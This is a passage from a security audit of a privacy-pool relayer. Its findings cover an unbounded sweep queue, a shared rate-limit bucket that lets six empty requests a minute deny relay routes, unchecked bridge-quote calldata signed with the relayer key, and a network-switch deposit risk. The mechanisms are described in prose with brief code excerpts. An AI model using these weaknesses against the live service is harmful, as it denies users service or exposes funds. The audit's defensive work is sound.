Nothing bounds who may add to that list. A job is registered for every relay carrying the `dustRescue` flag, and that flag is an uncommitted field: `zEvmRelaySwapRequest` extends the base relay request with `dustRescue: zDustRescue.optional()`, and `dustRescue` appears nowhere in the signed fee commitment, which carries only the asset, the amounts, `relayCost`, `feeBps`, `flatFee`, `maxRelayFee` and an expiration. `EvmRelayService.relaySwap` registers the job after `sdkRelaySwap` returns, and every guard above that point tests commitment validity, the fee recipient, the `nativeGas` and `swapValue` ceilings and `maxRelayFee`; none tests whether the swap is cross-chain, whether it is a reshield, or whether it delivers anything to the rescue wallet. A registration gate rejecting a `dustRescue` request whose swap is neither cross-chain nor a reshield would bound the queue, and there is none: the only requirement is that the caller's own swap calldata succeed against an allowlisted router.

The design document treats the feature in one direction only: its "Trust extension (accepted, not hidden)" paragraph reasons about what the relayer might do to the caller, mis-derive the stealth address, delay indefinitely, keep the dust, and offers after-the-fact observability as the mitigation. That the caller might be the adversary, and that the job they author lands in a work list shared with every other user, is considered nowhere in it and guarded against nowhere in the code.

**The price of one job.** The relay-swap quote charges the caller `relaySwapTxCost = Gas(900_000n)`, plus `b2GasSwapTxCostSurcharge = Gas(160_000n)` when a Mainnet-destination reshield carries `swapValue > 0`, converted to the withdrawn asset at the chain's gas price, and a fee of `min(maxRelayFee, relayCost + (feeBps > 0 ? amountOut*feeBps/10000 : flatFee))`, where the sample relayer configuration sets `fee_bps` to 10 for the native asset and `flat_fee_amount` to 21000 base units for assets with no bps rate. The repository prices the gas component itself: the quote service's own unit test works 650,000 gas out to $1.625 at one gwei with ether at $2,500, so 900,000 gas is $2.25, and Arbitrum and Base, the only two chains in the dust-rescue configuration, ordinarily price gas far below one gwei. No bridge fee is required at all, because nothing forces the swap to be cross-chain; the principal returns to the caller at a destination of their choosing, and the same capital can be recycled relay after relay.

The service's own registration limit does not contain it. The relay routes carry `@Throttle({ relay: {} })` against a named bucket of five requests per sixty seconds and `ThrottlerGuard` is registered globally, but no custom tracker or key generator is defined anywhere, and the relayer's `bootstrap` never sets Express's `trust proxy`, so the default tracker is the immediate peer's address: behind a platform front end that is one bucket shared by every caller rather than one per caller, and even a genuine per-caller limit would not slow a caller who rotates addresses. Every accepted relay carrying the flag is one more job.

**How the queue drains, and whether it drains at all.** `recordFailure` increments `attempts` and marks the job `FAILED` once `attempts` reaches `sweepMaxAttempts`, which the shipped example configuration sets to `5`. A job that raises on every pass therefore occupies the list for five passes, 25 minutes, before going terminal, which puts the steady-state population from an injection rate of R jobs per minute at 25 × R, or about 125 concurrent jobs at the shared bucket's five relays a minute. Whether a junk job raises at all depends on how the bridge status API answers for a hash it does not recognise, and the repository asserts two different answers:

- `LiFiSwapQuoteProvider.mapStatusResponse` carries the comment "LiFi returns INVALID for unrecognized/expired transfers" and normalises that terminal verdict to `NOT_FOUND`, on which `checkLeg`, the detection helper that reads one transfer's status, returns `WAIT`. No exception reaches the sweep loop, no attempt is charged, and the job never goes terminal, so residency is unbounded and the work list grows monotonically at whatever rate relays are accepted.
- The repository's own cross-chain integration test wraps `getSwapStatus` in a `try`/`catch` because "Transient 404s from LiFi's indexing lag are treated as 'not yet indexed, retry' rather than test failures". A 404 is a non-2xx, and `getSwapStatus` raises `SwapStatusFailed` on any non-2xx, so on this branch the exception propagates out of `checkLeg` and `check` into the sweep loop's `catch` and is charged to the job as an attempt.

The service handles neither case correctly, and the two failure modes point in opposite directions. On the first, junk never ages out of the queue. On the second, an honest job whose forward leg is merely not yet indexed spends real attempts, and can be marked `FAILED`, while it waits to become visible. `DetectionService`'s unit test pins the `NOT_FOUND` to `WAIT` behaviour by mocking a resolved value, so it never exercises the throw path at all.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts#L10-L34
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/jobs/firestore-job-store.service.ts#L56-L59
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/README.md#L184-L189
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/.github/workflows/dust-rescue-service-gcp-deploy.yml#L96-L102
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/schemas.ts#L271-L277
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/evm.relay.service.ts#L467-L495
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/LiFiSwapQuoteProvider.ts#L303-L310
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/detection/detection.service.ts#L41-L75

#### Impact

The sweep is a fixed-capacity sequential loop fed by an externally controlled queue that nothing bounds. Once a pass exceeds its 300-second budget the request is killed mid-loop, `run` never returns, and every job after the cut-off is never examined; the next tick starts the same truncated pass again.

The jobs that get cut off are not an arbitrary set: they are systematically the ones that have made progress. `listNonTerminal` supplies no `orderBy`, so the ordering is Firestore's implicit ordering for a not-in query, the filtered field first and then document ID. The filtered field is `state`, and the non-terminal state strings sort `AWAITING_DESTINATION` < `PENDING` < `PROVING` < `SUBMITTED` < `SUBMITTING`, so every job still waiting on a destination is served before every job that has already advanced. A junk job never leaves `AWAITING_DESTINATION` and sits permanently at the front; the jobs beyond a truncation point are deterministically those in `PROVING`, `SUBMITTING` and `SUBMITTED`, holding real, already-detected dust with a proof built or a deposit in flight. That ordering is stable across sweeps, so the same honest jobs are skipped every time.

Four premises here concern systems outside the repository and were not executed: Cloud Run's 300-second default request timeout, Firestore's implicit ordering for a not-in query, live gas prices on Arbitrum and Base, and how the bridge status API answers for a hash it does not recognise.

One precondition bounds the harm: a job is born from a genuine relay, which requires a valid proof against the current roots, so the caller must already hold a position in the pool. The effect is degraded service rather than moved funds: the dust of a starved job stays where it was, under operator control, and the shared rescue wallet's balance is unaffected.

#### Recommendation

We recommend bounding the sweep so that its cost is a decision rather than a consequence: order `listNonTerminal` by last-update time and apply an explicit limit, so a pass is finite and every job is eventually reached rather than the same tail being skipped every time; add an age-out for jobs stuck awaiting a destination or awaiting a submission; and set `--timeout` explicitly on the Cloud Run service rather than inheriting the platform default, at a value below the scheduler period so a pass cannot still be running when the next one starts. Gate registration on the shape of the work by requiring the `dustRescue` flag to accompany a cross-chain contract-call quote, binding the flag into the signed fee commitment so the relayer registers only work it quoted for, and rate-limiting registrations per source address in the dust-rescue path itself rather than relying on the relay endpoint's throttle, which is a single shared bucket behind a proxy and not a per-caller control. Classify status errors instead of treating every outcome alike: a `NOT_FOUND` on a leg younger than a few sweeps is a wait, a `NOT_FOUND` on an older leg, including the `INVALID` verdict that `mapStatusResponse` currently folds into it, is a dead leg that should contribute zero, record why and retire the job rather than sitting in the queue forever, and a rate-limit or server error should be retried without consuming the job's attempts. Stop discarding that distinction in `mapStatusResponse`, and have the status client surface the HTTP status code on the error object rather than only formatting it into the message, so the sweep can tell a transient failure from a permanent one.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #011 — Behind the platform proxy every client shares one rate-limit bucket, so six requests a minute deny a relay route

**Severity:** Medium · **Location:** `packages/relayer/relayer/src/app.module.ts` · **Bug:** Medium · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Status:** Open

#### Description

A user who does not want to broadcast their own transaction hands it to the relayer instead. The relayer quotes a fee over HTTP, takes the signed request back over HTTP, and submits the transaction on the chain named in the route the request was posted to. That surface is open to anyone who knows the address, so the service meters it: twenty quote requests and five relay requests every sixty seconds, counted per client, so that one caller cannot consume the service for everybody else.

Being refused by the relayer is not fatal on its own. `PoolVault.transact` is callable by anyone willing to pay their own gas, so a user with a funded address can re-prove and submit for themselves. Not every route has that fallback. `registerAndWithdrawal` exists, in its own summary, so "the recipient never has to fund their address to pay registration gas", and its service method records that "the relayer absorbs the extra keystore-registration gas". Self-submission presupposes exactly the funded address that route was built to avoid needing, so for the people who use it the relayer is the only way in and a refusal has no workaround.

**Where it breaks.** The limit is written per client and computed per connection, and in the deployment the repository documents those are not the same thing:

- the value the guard buckets on is the address of whoever opened the TCP connection, the socket peer, and behind a hosting platform's front end that address is the front end's, one and the same for every caller in the world;
- the key it buckets under is the controller class, the handler method and the profile name, and nothing else, so the chain identifier that the route path carries never reaches it either.

A bucket meant to hold one caller on one chain therefore holds every caller on every chain that instance serves.

Five requests in any sixty seconds fill a relay route's allowance and the sixth is refused for everyone at once, the refusal is raised ahead of every validation step so the requests need not be well formed or carry funds or a proof, and because the block simply lapses and another six requests reinstate it, one caller holds a relay route closed indefinitely for the price of six empty POSTs a minute.

The relayer rate-limits per client. `AppModule` configures two named throttles, or profiles, and applies `ThrottlerGuard` globally:

```ts
ThrottlerModule.forRoot([
    { name: "quote", ttl: 60_000, limit: 20 },
    { name: "relay", ttl: 60_000, limit: 5 },
]),
```

`ThrottlerGuard` identifies a client by `req.ip`. Its base `getTracker` is `async getTracker(req) { return req.ip; }` in the pinned `@nestjs/throttler` 6.5.0, and the guard reaches it by falling through a route-or-class `@Throttle` tracker, then a per-profile `getTracker`, then a module-wide one. None of the three is set anywhere in the monorepo: a repository-wide search for `getTracker` outside `node_modules` returns nothing at all.

Under Express, `req.ip` is the socket peer unless the application opts into proxy awareness by setting `trust proxy`. The relayer pins Express 5.2.1, whose application initialiser sets `trust proxy` to `false` and whose `req.ip` getter is `proxyaddr(this, trust)`; with an always-false trust function proxy-addr truncates the address list to its first entry, so the value returned is the socket peer regardless of what `X-Forwarded-For`, the header in which a proxy records the caller it is forwarding for, carries. `bootstrap` never sets it, configuring CORS, URI versioning and Swagger and performing no `app.set` of any kind, and the string `trust proxy` appears nowhere in the monorepo outside `node_modules`.

The service runs behind a platform front end. Three committed files default the relayer to the Cloud Run host `https://relayer-v2-testing-149184580131.us-east1.run.app` under a comment reading "The live services, not a locally-started relayer process": the two `live-relayer-*-eth-dust-rescue` integration sketches in the swaps package and the `b2-mainnet-reshield-sizing` script. The smoke package's header says it "targets a live, already-deployed instance over HTTP only", and `relayer-gcp-deploy.yml` carries the `gcloud run deploy` that produces such an instance. Behind that front end the socket peer is the platform's proxy rather than the caller, and the tracker stops distinguishing clients.

The bucket is per handler, and the sixth request is the one that trips it. `ThrottlerGuard.generateKey` hashes `` `${context.getClass().name}-${context.getHandler().name}-${name}-${suffix}` ``: controller class, handler method, profile name, tracker. `ThrottlerStorageService.increment` then blocks when `totalHits > limit`, so under a limit of 5 the first five requests pass and the sixth is the first to receive HTTP 429. Storage is a process-local `Map`, with no Redis and no `ThrottlerStorage` override anywhere, so a bucket is scoped to one instance. Three consequences follow from what that key does and does not contain.

- It contains the handler name, so each route has its own bucket. `RelayController` declares six routes carrying `@Throttle({ relay: {} })`: `withdrawal`, `registerAndWithdrawal`, `relayAndAnnounce`, `transfer`, `batchWithdrawal` and `relaySwap`, all six of which the SDK's `RelayerInteractor` posts to. Six requests hold one; thirty-six hold the whole relay surface.
- It does not contain the route parameters. `RelayController` is mounted at `@Controller("relay/:chainType/:chainId")` and the chain identifier never reaches the key, so every configured chain shares one bucket per route and six requests a minute deny relayed withdrawals on every chain at once. That a single instance serves several chains is in the tree: the optimism-to-mainnet rescue sketch points the same `RELAYER_URL` at chain 10 and chain 1.
- Routes that opt into no profile are evaluated against both, and bind at the stricter one. `ThrottlerGuard.canActivate` loops every configured throttler unless a route or class skips it by name, and `AppController.ping` and all three `DetailsController` routes, `getAllDetails`, `getChainDetails` and `getAssetDetails`, carry neither `@Throttle` nor `@SkipThrottle`, so the 5/60s `relay` profile is checked against them too and fires first. `/v1/details` is the service-discovery endpoint from which the smoke suite and the end-to-end helpers derive every other call.

Across the whole surface that is 36 requests a minute for the six relay routes, 105 for the five quote routes the `@SkipThrottle({ relay: true })` holds at 20/60s, and 24 for the four undecorated ones: 165 a minute holds every route on an instance.

The cross-profile behaviour has already bitten the team once, and the record is in their own hand: `QuoteController` carries that `@SkipThrottle({ relay: true })` under a comment explaining that the global guard "checks a route against every configured throttle profile, not just the one it opts into via @Throttle -- without this, quote routes were also being checked against (and exhausted by) the much stricter 'relay' profile (5/60s)". One controller was patched; `AppController` and `DetailsController` never received the same treatment, and `main.ts` never received the tracker fix that would have made any profile per-client in the first place.

The defect is invisible in the frame the team tests in. The end-to-end harness drives the service in-process, where the socket peer really is the client, so per-client limiting behaves as written; Docker Compose is no counter-example either, since with `"3000:3000"` published host traffic reaches the container from the bridge gateway and the same collapse occurs there, unobserved because a Compose stack has one developer. No test in the relayer's unit, end-to-end or smoke packages exercises the guard or asserts a 429. `smoke.test.ts` does space its calls with `QUOTE_REQUEST_SPACING_MS`, under a comment giving two reasons, "both to avoid tripping that limit ourselves and to not compete with real users' quota"; the second is coherent only if the bucket is shared, though the comment records an observation rather than a diagnosis.

Nothing here was executed: no harness was built, no 429 was observed and no live host was probed, so the mechanism is read off the pinned `@nestjs/throttler` and Express sources and the controllers that use them. Whether a front-door limiter sits in front of the production service also cannot be answered from the repository, since the service name is a workflow secret and a Cloud Armor policy can only attach to an external application load balancer, which the bare `*.run.app` host is not behind. Any committed artifact placing a per-client bound outside the application would make the application-layer tracker a redundant second control rather than the only one, and there is none: a repository-wide search outside `node_modules` for `trust proxy`, `X-Forwarded-For`, `Cloud Armor`, `load balancer`, `nginx` and `ingress` returns zero hits, and so do `getTracker`, `generateKey` and `ThrottlerStorage`.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/app.module.ts#L16-L19
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/app.module.ts#L37-L40
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/main.ts#L13-L47
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/relay.controller.ts#L40-L45
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/quote/quote.controller.ts#L41-L47
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/app.controller.ts#L4-L12
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/details/details.controller.ts#L10-L39
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/evm.relay.service.ts#L110-L127
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/smoke/src/smoke.test.ts#L45-L48
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/test/live-relayer-optimism-to-mainnet-eth-dust-rescue.integration.test.sketch.ts#L150-L154
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/.github/workflows/relayer-gcp-deploy.yml#L94-L98
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L137-L143

#### Impact

Any caller can deny a named relay route to every other user of an instance, on every chain it serves, with six empty POSTs a minute; 165 a minute holds every route, including the `/v1/details` discovery endpoint clients need before they can call anything else. The 429 is raised ahead of every validation pipe, so the bodies need not be well formed, and no funds, no note and no protocol interaction are required.

The sixty-second window is not a bound on the harm. `blockDuration` defaults to `ttl`, `blockExpiresAt` is set once and not extended, and hit counting is suspended while blocked, so the block expires and costs another six requests per route per minute to reinstate: the price of indefinite denial is 6 requests/minute/route, not a burst followed by recovery. Per-instance scoping does not dilute it either, because the deploy command sets no concurrency or instance-count flags, so at low traffic the platform's defaults keep a single instance.

Self-submission bounds the damage across most of the relay surface but not all of it. `PoolVault.transact` is `external` and requires only `_transactParams.processor == msg.sender`, so a user with their own gas can bypass the relayer, though one holding a relayer-bound proof must re-prove first because the proof's context commits to `_transactParams`. That exit does not exist for `registerAndWithdrawal`, which exists, in its own summary, so "the recipient never has to fund their address to pay registration gas", and whose service method records that "the relayer absorbs the extra keystore-registration gas". Self-submission presupposes exactly the gas that route was built to avoid, so for that population denial has no workaround.

#### Recommendation

We recommend making the tracker the real client. Enable Express proxy awareness with the hop count the deployment actually has, `app.set('trust proxy', 1)` for a single platform front end, rather than `true`, which trusts the entire `X-Forwarded-For` chain and would let a caller spoof an arbitrary client address and evade the limit entirely; setting it to `true` converts this finding into a worse one, so the hop count matters. Alternatively, override `getTracker` in a `ThrottlerGuard` subclass to read the forwarded-for header explicitly, taking the client-most entry the proxy guarantees, and fall back to `req.ip` when the header is absent.

We also recommend deciding deliberately what `AppController.ping` and the three `DetailsController` routes should be limited at, since today they inherit the strictest profile by default: either add `@SkipThrottle({ relay: true })` to both controllers, as `QuoteController` already carries, or give discovery and liveness their own named profile. Override `generateKey` so it incorporates the `:chainType`/`:chainId` route parameters, so pressure on one chain's relay route does not deny the same route on every other chain. Add a test that exercises the guard through a proxy hop and asserts both the 429 boundary and the tracker's identity, noting that the boundary is at the sixth request under a limit of five, not the fifth, because the storage layer blocks on `totalHits > limit`. Until the fix lands, a platform-level limiter in front of the service bounds the exposure without touching the code, but it has to be one that can attach: a bare `*.run.app` host cannot carry a Cloud Armor policy, so that route requires putting the service behind an external application load balancer first.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #012 — The relayer signs bridge calldata from the quote provider without checking it against `approvedRouters`

**Severity:** Medium · **Location:** `packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts` · **Bug:** Medium · **Payout:** High · **Novelty:** NEW · **Reach:** AUTH · **Kill chain:** KC-03 · **Status:** Open

#### Description

A cross-chain reshield moves a user's position out of the pool on one chain, swaps it into a bridgeable token, bridges the proceeds, and redeposits them on another. The source-chain swap does not consume its whole input, so `RelaySwaps` sweeps the remainder aside to the `dustRecipient` address the relayer's signed fee commitment names; the code calls that remainder "dust #1". The relayer then bridges dust #1 to the destination chain itself, so the dust-rescue service can hand it back to the user together with the leftover stranded at the far end. To bridge it, the relayer asks LiFi, an external bridging service, for a quote, approves the spender the quote names, and sends the transaction the quote describes.

The protocol does not trust that quote provider, and says so. `RelaySwaps.execute`, the contract the user's own swap goes through, requires both the swap target and the approval spender to appear in `approvedRouters`, an on-chain allowlist of vetted routers, and the second of those two checks carries a comment giving the reason: pinning the approval to the same vetted allowlist exists "so a subverted quote cannot route the approval to an un-vetted address". The control the situation calls for already exists, is already authoritative for the swap path, and is already readable from the relayer's own RPC client. Nothing downstream would catch a lapse in it either: the forward swallows every error so that a failure there cannot break the user's request, and once a transaction has been signed and broadcast nothing in the relayer observes it, reverses it or alerts on it.

**Where it breaks.** The dust forward fetches a quote from that same provider and never consults that allowlist, so the same two addresses are vetted on one path and taken on faith on the other:

- the call target: checked against `approvedRouters` on chain when the user's own swap runs; on the forward path it is `quote.transactionTo`, a field of an HTTP response body, handed to the signer unread;
- the approval spender: checked against `approvedRouters` by the requirement written specifically to stop a subverted quote; on the forward path it is `quote.approvalAddress`, out of that same response body.

Whoever controls that response, which means the quote provider itself or someone interposed on the connection to it, therefore obtains one transaction of their choosing signed by the relayer's source-chain key, and because the calldata is unconstrained it need not be a bridge transfer at all: a plain ERC-20 transfer of that signer's entire balance fits the same primitive, and the signer is the address the relayer's token-denominated fees are routed to whenever a relay carries native gas.

In the relayer, `DustRescueForwardingService.forward` bridges the source-chain leftover ("dust #1") by executing a quote it fetches from LiFi. It approves the spender the quote names and sends the transaction the quote describes, verbatim:

```ts
const quote = await this.lifi.getSwapQuote({ ... });
...
await this.maybeApprove(fromAddress, params.proofAsset, quote.approvalAddress, sweptAmount);
...
const forwardTxHash = await this.chainService.sendRawTransaction({
    to: quote.transactionTo,
    data: quote.transactionData,
    value: 0n,
});
```

`quote.transactionTo`, `quote.transactionData` and `quote.approvalAddress` are all fields of the HTTP response body, and nothing sits between the quote and the broadcast but two log lines and `maybeApprove`. A read of `RelaySwaps.approvedRouters`, or of any other allowlist, against `quote.transactionTo` and `quote.approvalAddress` between `getSwapQuote` and the broadcast would falsify this finding, whether in `DustRescueForwardingService`, in `EVMChainService.sendRawTransaction` or in a wrapper between them. There is none: a search of `packages/relayer` for `approvedRouters` and for the SDK's `assertLiFiAddressAllowed` returns zero hits outside `node_modules`, and the only allowlists that package holds are CORS origins and `allowed_processors`, neither of which is consulted here.

The sender is the relayer's own per-chain signer for the source chain. `EVMChainService.sendRawTransaction` obtains it from the same private `signer()` helper that every other write on that service goes through, which builds a viem account from the per-chain config wrapper's `signerPrivateKey`, the `SIGNER_PRIVATE_KEY_<chainId>` environment value falling back to the config file's `signer_private_key`. It then forwards `to`, `data` and `value` straight into `walletClient.sendTransaction` with no target validation of its own, and its doc comment names the caller: the dust-rescue forwarding service, supplying "LiFi-provided swap calldata". It is the only `sendTransaction` in the chain service, and every other relayer write is a `writeContract` against a typed ABI.

This is the one place in the relayer where an external service's response becomes a signed transaction with no intermediate authorisation. Every other relayer write path is anchored to something the user proved: relay calls carry a proof whose context binds the recipient and the fee, and `RelaySwaps.execute` re-checks both addresses on chain with `require(approvedRouters[_r.swapTarget])` and, immediately after it, `require(approvedRouters[_r.approvalAddress])`, the second carrying the comment that pinning the approval to the same vetted allowlist exists "so a subverted quote cannot route the approval to an un-vetted address". The protocol has already named this threat and built the control for it. The dust forward has no proof to anchor to, being the relayer's own follow-up action after the user's relay swap has already landed, and it never reads that control.

The in-code rationale on `execute`'s native branch adds a second claimed layer: "The SDK independently verifies both addresses against `approvedRouters` before proving (defense in depth)." No SDK is involved on this path. The quote is fetched inside the relayer process by a `LiFiSwapQuoteProvider` the service constructs itself, and consumed in the same function.

Five conditions have to hold on the ordinary operating path before a hostile response body gets its chance, in this order:

1. The relay-swap request carries a `dustRescue` block, which is the condition `EvmRelayService.relaySwap` runs the whole dust block under.
2. The destination asset prices. `DustRescuePricingService.priceForRescue` is awaited before `forward` and throws if the destination chain has no entry in `REFERENCE_STABLECOIN_BY_CHAIN_ID`, which carries four chains (1, 10, 42161, 8453), so a BSC destination throws here and `forward` is never reached. Native-asset dust additionally needs `WRAPPED_NATIVE_BY_CHAIN_ID`, which carries one chain (1). A throw is caught at the `relaySwap` level and downgraded to a warning on a success response, so the forward simply does not happen.
3. Dust #1 is ERC-20 and left a `Transfer` log to the commitment's `dustRecipient`. `parseSweptAmount` returns `undefined` otherwise, and the service's class doc records native-ETH dust as silently skipped by design.
4. The swept amount, after the relay fee is subtracted (which happens only when fee recipient and dust recipient are the same address), is at least `MIN_FORWARD_AMOUNT`: 50,000 base units of the source token, about 0.05 USDC at six decimals per the constant's own comment.
5. The destination chain has a `dust_rescue_recipient_address`. `dustRescueRecipientAddress` reads `DUST_RESCUE_RECIPIENT_ADDRESS_<chainId>` from the environment first and no committed configuration sets one, so whether a given chain is armed is a deployment fact the repository does not settle; on the committed tree alone this precondition is unmet.

Only after all five does the quote get requested, and only then does the response reach the signer.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts#L146-L172
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/relay/evm/dust-rescue-forwarding.service.ts#L207-L222
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/chain.service/evm.chain.service.ts#L460-L482
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L264-L281
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/relayer/src/rate_provider/reference_stablecoin.ts#L18-L46

#### Impact

Whoever controls the quote response controls one transaction signed by the relayer, with attacker-chosen target and attacker-chosen calldata. The attacker set is narrow and nothing here is permissionless: a compromise inside the quote provider, or interposition on the TLS connection to it. There is no proxy layer in the deployment to subvert, because the service constructs its provider with an API key and no `apiUrl`, so the request goes to the provider's own default public endpoint, and the API key is not the control: it travels as an `x-lifi-api-key` request header and authenticates the relayer to LiFi, not LiFi to the relayer.

The ceiling is everything the relayer's source-chain signer holds in ERC-20, and it is not limited to what that signer has approved. Because `sendRawTransaction` forwards arbitrary `data`, the attacker needs no allowance at all: a plain `transfer(attacker, balance)` against any token the signer holds is inside the same primitive, and `maybeApprove` is redundant to it. Native funds are out of reach through this path, since `value` is hard-coded to `0n` both at the forward call site and inside `maybeApprove`, so the signer loses only gas there. The one term the repository cannot size is the account's own on-chain authority: which key signs on a given chain is the `SIGNER_PRIVATE_KEY_<chainId>` environment value, and the shipped example configuration's `signer_private_key` is the literal placeholder `0x<RELAYER_SIGNER_PRIVATE_KEY>`, so the deployed identity lives outside the repository. Whatever that account is permitted to do on the source chain, this primitive lets a hostile response body do once per forward.

That account is not an incidental holder of tokens. `resolveFeeReceiver` routes the token-denominated relay fee to the signer's own address whenever a relay carries `nativeGas > 0` and the configured fee receiver is not already the signer, so that the token reimbursement offsets the ETH that signer fronted; its own comment warns that otherwise "the signer hot wallet drains on every relay that carries `nativeGas > 0`". Relay fees accumulate at the address this defect exposes.

The narrow window does not buy recoverability. `forward` wraps every step in a `try`/`catch` that logs and returns `undefined`, and `EvmRelayService.relaySwap` catches the whole dust block a second time, so nothing throws into the caller's HTTP request. That is fail-closed for the request and not for the transaction: by the time any of it runs, the transaction has been signed and broadcast, and nothing in the relayer observes it, reverses it or alerts on it. `maybeApprove` compounds this in the small, returning early when the existing allowance already covers the amount, so an allowance granted to a spender a previous response named is never reset or revoked, only reused.

#### Recommendation

We recommend checking the quote before signing it: read `RelaySwaps.approvedRouters` on the source chain for both `quote.transactionTo` and `quote.approvalAddress`, and refuse the forward when either is absent from it. The allowlist already exists, is already authoritative for the swap path, and is already reachable from the relayer's own RPC client; this call site simply does not read it. Refusing costs only the swept dust itself, at least 50,000 base units left where they already sit, which the surrounding code already treats as an acceptable outcome on every other skip branch. Constraining `EVMChainService.sendRawTransaction` itself rather than only its caller would go further, since it is the only unvalidated signing primitive in the service and any future caller inherits the same exposure: an explicit allowed-target argument would make that constraint impossible to forget. Approve exactly the amount to be spent and revoke the remainder after the forward settles, rather than leaving a standing allowance to an address a response named, because `maybeApprove`'s early return means such an allowance survives indefinitely and is reused by later forwards without being re-examined.

We also recommend correcting the rationale comment on `RelaySwaps.execute`'s native branch so that it describes a check that exists on the path it is written on, and stating which party performs the allowlist check on each path. As written it credits the SDK with a verification that this relayer path never reaches, and a reader who takes it at face value will conclude the quote provider is bounded everywhere it is not.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #013 — A network switch after session build sends the deposit to the same address on another chain

**Severity:** Medium · **Location:** `packages/sdk/src/services/walletInteractors/EIP1193WalletInteractor.ts` · **Bug:** Medium · **Payout:** Medium · **Novelty:** NEW · **Reach:** THEORY · **Status:** Open

#### Description

An application built on the SDK opens a pool session once, for one account on one chain, and then uses that session for every deposit, withdrawal and transfer the account makes. The session holds that chain's contract addresses, and it reaches the user's wallet through an EIP-1193 provider, the standard request interface an injected browser wallet exposes, handing it each transaction to sign and broadcast. At the moment the session is built it checks two facts about the wallet: that it is unlocked to the account the session is for, and that it is connected to the chain the session targets.

Neither fact stays true by itself. Switching network, or switching account, is an ordinary thing to do in a multi-chain wallet, and a user may do it between opening a session and making a deposit for reasons that have nothing to do with this application. Once such a deposit is broadcast nothing recalls it. The deposit proof is bound to the note data alone, with no chain and no vault address in it, and no contract in the tree reads `block.chainid`, so nothing at the far end is in a position to notice the deposit was meant for somewhere else and turn it away. Nor does anything tell the user what happened: what the SDK surfaces is a bare receipt-wait timeout naming neither a cause nor a remedy, so a user who reads that as a failed deposit and retries has made two.

**Where it breaks.** The two facts are checked once and then never restated, because the transaction the session later hands to the wallet asserts neither of them:

- the chain: the session targets one chain id, and the request sent to the wallet carries no `chainId` field at all, so the wallet signs for whichever network it happens to be on;
- the account: the session belongs to one owner address, and the sending address is re-read live from the wallet immediately before signing and never compared against that owner, so a switched account becomes the sender rather than being rejected.

A user who has switched networks therefore sends a real, value-bearing deposit to the same configured address on a chain they did not choose, where it either lands in a live pool the session will never scan, leaving a note that stays pending forever with nothing to say it is recoverable, or transfers into an address holding no code, where it rests permanently and no private key exists to move it.

`assertWalletMatchesAccountAndChain` runs once, when the session is built. It confirms that the connected wallet's account matches the one the session is for and that the wallet is on the chain the session targets, and `PoolSessionBuilder.create` invokes it twice during construction: through `assertWalletMatchesSession` for the pool-chain wallet, and directly for the cross-chain swap-deposit source wallet. Nothing checks either fact again, and `getChainId` has exactly one consumer in the SDK: that assertion.

